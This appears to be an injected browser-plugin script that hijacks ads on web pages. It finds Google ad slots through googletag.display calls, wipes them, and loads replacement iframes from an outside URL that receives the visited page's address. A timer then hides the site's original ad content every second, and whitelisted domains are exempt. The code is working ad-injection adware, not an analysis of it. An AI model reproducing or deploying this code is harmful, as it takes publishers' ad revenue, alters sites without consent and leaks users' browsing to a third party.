//whitelist_gpt
var circleTimer_gpt_ads;
var totalNum_gpt_ads = 0;
var google_ad_id = new Array();
var google_dom_id = new Array();
var ifm_id_gpt = 'dfwefjewfwef3331175';
var js_rps_id = '_b765ddfdfdfclassRps_';

// replaceSize   -  注入参数
/*
*	判断某个值是否在数组中
*/
function IsInArray(arr,val)
{
    var testStr=','+arr.join(",")+",";
    return testStr.indexOf(","+val+",")!=-1;
}

/*
*		元素 onload
*/
function elementOnload(elm,callBack)
{
	if(elm.attachEvent){  
        elm.attachEvent("onload",function(){
           callBack(); 
        });  
    }else{  
        elm.onload=function(){  
           callBack();
        };  
    }  
}

/*
*		是否在白名单中
*/
function isInWhiteList_gpt()
{
	var flagRet = false;
	var itemArr = new Array();
	var whiteListArray = new Array();
	whiteListArray = whitelist_gpt.split("|");
	var dmain = document.domain;

	for(var i = 0; i < whiteListArray.length; i++)
	{
		itemArr = whiteListArray[i].split(",");

		if(itemArr.length != 2) continue;
		if(dmain.indexOf(itemArr[0]) >= 0)
		{
			flagRet = true;
			break;
		}
	}
	return flagRet;
}

/*
*	获取页面中广告 div id
*/
function getGoogleAdIds_gpt()
{
	var html_source_code = document.documentElement.innerHTML;
	var find_str = 'googletag.display(\'';
	var find_str_2 = 'googletag.display("';
	var startIndex = 0;
	var start_pos = 0;
	var end_pos = 0;
	var yh_mod = 0;  // 1 - 单引号  2 - 双引号
	var AD_ID_MAX_LEN = 50;
	var now_div_id = null;

	while(true)
	{
		 start_pos = html_source_code.indexOf(find_str,startIndex);
		 if(start_pos == -1)
		 {
			start_pos = html_source_code.indexOf(find_str_2,startIndex);
			if(start_pos == -1) break;
			yh_mod = 2;
		 }
		 else
		{
			yh_mod = 1;
		}

		startIndex = start_pos;

		if(yh_mod == 1)
		{
			 end_pos = html_source_code.indexOf('\')',startIndex);
		}
		else if(yh_mod == 2)
		{
			end_pos = html_source_code.indexOf('\")',startIndex);
		}
		 if(end_pos == -1)break;
		 startIndex = end_pos;
		 now_div_id = html_source_code.substring(start_pos + find_str.length,end_pos);

		 if(now_div_id.length > AD_ID_MAX_LEN) continue;
		 if(!IsInArray(google_ad_id,now_div_id)) google_ad_id.push(now_div_id); 
		 
	}

}

/*
*	设置 js 注入标志
*/
function setJsInTag_gpt()
{

	var _div = document.createElement('div');
	_div.id = js_rps_id;
	_div.style.display = 'none';
	document.body.appendChild(_div);
}

/*
*  js 调用回调函数
*/
function showReplaceCallBack_gpt()
{
  if(window.pgCbk != null) window.pgCbk.adCallBack('adshow_replace');//此处是传给插件的参数
}


/*
*  set div inline
*/
function setElementShow_gpt(ob)
{
	for(var i = 0; i < 5; i++)
	{	
		if(ob == null) break;
		if((ob.style != null) &&(ob.style.display == 'none'))
		{
			ob.style.display = '';
			break;
		}
		ob = ob.parentNode;
	}

}

/*
*	定时器执行的函数，用于检测节点个数
*/

function timer_check_node_num_gpt()
{

	var needDelNodes = new Array();
	if(google_dom_id.length == 0) return;
	for(var i = 0; i < google_dom_id.length; i++)
	{
		needDelNodes.length = 0;
		var adNode = document.getElementById(google_dom_id[i]);
		if(adNode == null) continue;
		if(!adNode.hasChildNodes()) continue;
		if(adNode.childNodes.length == 1) continue;
		for(var j = 0; j < adNode.childNodes.length; j++)
		{
			
			if((adNode.childNodes[j].id == null) || (adNode.childNodes[j].id == '') || (adNode.childNodes[j].id == undefined)) needDelNodes.push(adNode.childNodes[j]);
			if(adNode.childNodes[j].id.indexOf(ifm_id_gpt) == -1)  needDelNodes.push(adNode.childNodes[j]);
		}	
		
		for(var k = 0; k < needDelNodes.length; k++)
		{
			var nowDNode = needDelNodes[k];
			if(nowDNode.style != null) nowDNode.style.display = 'none';
		}
	}
}

/*
*	添加需要替换广告节点 id
*/

function check_ad_num_gpt(dom_id)
{
	if(!IsInArray(google_dom_id,dom_id)) google_dom_id.push(dom_id); 
}

/*
* rps ad
*/
function rps_ad_gpt(id)
{
	var dom = document.getElementById(id);
	if(dom == null) return;
	var width_dom = parseInt(dom.style.width);
    var height_dom = parseInt(dom.style.height);
    var start_pos = 0;
	var end_pos = 0;
	var equal_pos = 0;
	var lastIndex = 0;
	var pregSizeStr = '';
	var retResult = false;
	// replaceSize 尺寸数组解析
	var size_str = width_dom + 'x'+ height_dom;
	
	start_pos = replaceSize.indexOf(size_str,lastIndex);
	if(start_pos != -1)
	{
		lastIndex = start_pos;
		end_pos = replaceSize.indexOf('|',lastIndex);
		if(end_pos != -1)
		{
			pregSizeStr = replaceSize.substring(start_pos,end_pos);
			equal_pos = pregSizeStr.indexOf('=');
			if(equal_pos == -1) 
			{
				dom.style.display = 'none';
				return;
			}

			var newSize = pregSizeStr.substring(equal_pos+1,pregSizeStr.length);
			if(newSize == '') return;
			var new_width = parseInt(newSize.split('x')[0]);
			var new_height = parseInt(newSize.split('x')[1]);
			
			if((new_width == NaN) || (new_height == NaN)) 
			{
				dom.style.display = 'none';
				return;
			}

			var iframe_gpt = document.createElement('iframe');
			iframe_gpt.id = ifm_id_gpt + Math.random();

			iframe_gpt.scrolling = "no";
			iframe_gpt.frameBorder = 0;
			iframe_gpt.width = new_width;
			iframe_gpt.height = new_height;
			iframe_gpt.marginHeight = 0;
			iframe_gpt.marginWidth = 0;
			iframe_gpt.topMargin = 0;
			iframe_gpt.leftMargin = 0;
			iframe_gpt.style.display = 'inline';
			iframe_gpt.allowTransparency=true;

			var src_gpt = InsURL;
			
			src_gpt = src_gpt.replace(/\[WIDTH\]/g, new_width);
			src_gpt = src_gpt.replace(/\[HEIGHT\]/g, new_height);
			src_gpt = src_gpt.replace(/\[WIDTHxHEIGHT\]/g,newSize);
			src_gpt = src_gpt.replace(/\[REFERRER_URL\]/g, encodeURIComponent(window.location.href));
				
			dom.innerHTML = '';
	
			iframe_gpt.src = src_gpt;
			elementOnload(iframe_gpt,showReplaceCallBack_gpt);
			dom.appendChild(iframe_gpt);
			setElementShow_gpt(dom);
			if(dom.id != '') check_ad_num_gpt(dom.id);
			retResult = true;
		}
	}

	if(!retResult)
	{
		dom.style.display = 'none';
	}
}


/*
*	主入口函数
*/
function main_init_gpt()
{
	if(replaceSize == undefined || replaceSize == '') return;
	var jsrpsid = document.getElementById(js_rps_id);
	if(jsrpsid != null || isInWhiteList_gpt()) return;	//说明js已经加入
	setJsInTag_gpt();
	setInterval("timer_check_node_num_gpt()",'1000');
	getGoogleAdIds_gpt();

	if(google_ad_id.length == 0) return;
	for(var i = 0; i < google_ad_id.length; i++)
	{
		rps_ad_gpt(google_ad_id[i]);
	}
}



/*
*	定时检测函数
*/
function checkPageState_gpt()
{
	totalNum_gpt_ads++;
	var did = document.getElementById('pgc0038455dde337');
	if(did == null) 
	{
		if(totalNum_gpt_ads >= 10)
		{
			 clearInterval(circleTimer_gpt_ads);
			 if(window.pgCbk != null) window.pgCbk.adCallBack('disable_web:' + page_web_pointer);
			 setTimeout('main_init_gpt()',5000);
		}
		return;
	}

	if(did.innerHTML == '1')
	{
		clearInterval(circleTimer_gpt_ads);
		main_init_gpt();
	}
}


/*
*	定时器入口函数
*/
function checkFuncMain_gpt()
{
 circleTimer_gpt_ads = setInterval('checkPageState_gpt()',1000);
}


checkFuncMain_gpt();